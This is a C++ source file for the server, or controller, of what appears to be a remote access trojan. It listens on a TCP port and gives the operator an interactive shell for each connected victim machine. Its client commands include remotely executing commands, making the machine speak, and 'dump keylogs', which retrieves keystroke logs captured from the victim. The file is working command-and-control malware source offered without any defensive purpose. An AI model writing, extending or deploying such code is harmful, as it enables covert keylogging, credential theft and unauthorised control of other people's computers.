#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <iostream>
#include <vector>
#include "server.h"
#include "extras.h"
#include "com_vars.h"
#include "main.h"
#include "command_def.h"
using namespace std;
#pragma comment (lib, "Ws2_32.lib")

vector<SERVER*> client_array;
vector<int> client_ids;
int id_var = 1;
int current_client = -1;

void function_failed(char* function_name)
{
	cout << function_name << " function failed with error code - " << GetLastError() << endl;
	system("pause");
	ExitProcess(1);
}

int main()
{
	WSADATA wsaData;
	struct addrinfo hints, *result;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	if(WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		function_failed("WSAStartup");
	}
	if(getaddrinfo(NULL, "1457", &hints, &result))
	{
		function_failed("getaddrinfo");
	}

	SOCKET ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if(ListenSocket == INVALID_SOCKET)
	{
		function_failed("socket");
	}

	if(bind(ListenSocket, result->ai_addr, result->ai_addrlen))
	{
		function_failed("bind");
	}
	freeaddrinfo(result);

	if(listen(ListenSocket, SOMAXCONN))
	{
		function_failed("listen");
	}
	DWORD connection_thread_identifier;
	ListenSocketStruct Thread_Param = { ListenSocket };  

	HANDLE connection_thread = CreateThread(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)handle_connections,
		&Thread_Param,
		0,
		&connection_thread_identifier
	);

	if(connection_thread == NULL)
	{
		function_failed("CreateThread");
	}

	admin_mode();
	closesocket(ListenSocket);
	return 0;
}

void handle_connections(LPVOID Thread_Param)
{
	ListenSocketStruct ListenSocket = *(ListenSocketStruct*)Thread_Param;
	while(true)
	{
		ClientSocketStruct ClientParam;
		ClientParam.ClientSocket = accept(ListenSocket.ListenSocket, NULL, NULL);
		ClientParam.id = id_var;
		//cout << endl << "New Connection Detected - Client ID " << id_var << endl;
		show_update("New Connection Detected - Client ID ", id_var);
	//	current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
		show_shell();
		CreateThread(
			NULL,
			NULL,
			(LPTHREAD_START_ROUTINE)handle_client,
			&ClientParam,
			0,
			NULL
			);
		id_var++;
	}
}

void handle_client(LPVOID ClientParam)
{
	ClientSocketStruct ClientSocket = *(ClientSocketStruct*)ClientParam;
	SERVER client(ClientSocket.ClientSocket, ClientSocket.id);
	int pos = client_array.size();
	int id_pos = client_ids.size();
	client_array.push_back(&client); // push client object's base address into global vector
	client_ids.push_back(client.get_client_id());
	string command;
	while (client.get_client_status() == 1) {
		if (current_client == client.get_client_id())
		{
			cout << "$ client-" << current_client << ": ";
			getline(cin, command);
			handle_client_panel(client, command);
		}
		else {
			command.assign("hello"); // Needs to be changed. Small lag due to sleep
			client.send_command(command);  // hello is sent after every 3 seconds to check client status
			Sleep(2000);
		}
	}
	//cout << endl <<"Client with ID - " << client.get_client_id() << " disconnected" << endl;
	show_update("Client with ID - ", client.get_client_id(), " Disconnected");
	if(current_client == client.get_client_id())
	{
		current_client = -1;
	}
	current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
	client_ids[id_pos] = 0;
	client_array[pos] = NULL;
}

void admin_mode()
{
	cout << " Welcome";
	display_admin_help();
	string command;
	getline(cin, command);
	while(command != "quit")
	{
		handle_admin_command(command);
		cout << "# ";
		getline(cin, command);
		//Sleep(200);
	}
}

void handle_admin_command(string& command)
{
	if(command.substr(0,7) == "client ")          
	{						
		int id = atoi(command.c_str() + 7);
		if (check_current_client_id(id)) {
			current_client = id;
			while (current_client != -1)
			{
				Sleep(1000);
			}
		}
	}
	else if(command == "admin help")
	{
		display_admin_help();
	}
	else if(command == "show clients")
	{
		show_clients();
	}
}

void handle_client_panel(SERVER& client, string& command)
{
	if(command == "exit")
	{
		current_client = -1;
	}
	else if(command == "disconnect")
	{
		current_client = -1;
		client.send_command(command);
	}
	else if(command == "help")
	{
		display_client_help();
	}
	else if(command == "username")
	{
		cout << client.get_username() << endl;
	}
	else if(command.substr(0,4) == "show")
	{
		client.send_command(command);
	}
	else if(command.substr(0,5) == "speak")
	{
		client.send_command(command);
	}
	else if(command == "dump keylogs")
	{
		client.send_command(command);
		client.recieve_file();
	}
	else if(command.substr(0,8) == "execute ")
	{
		client.send_command(command);
	}
}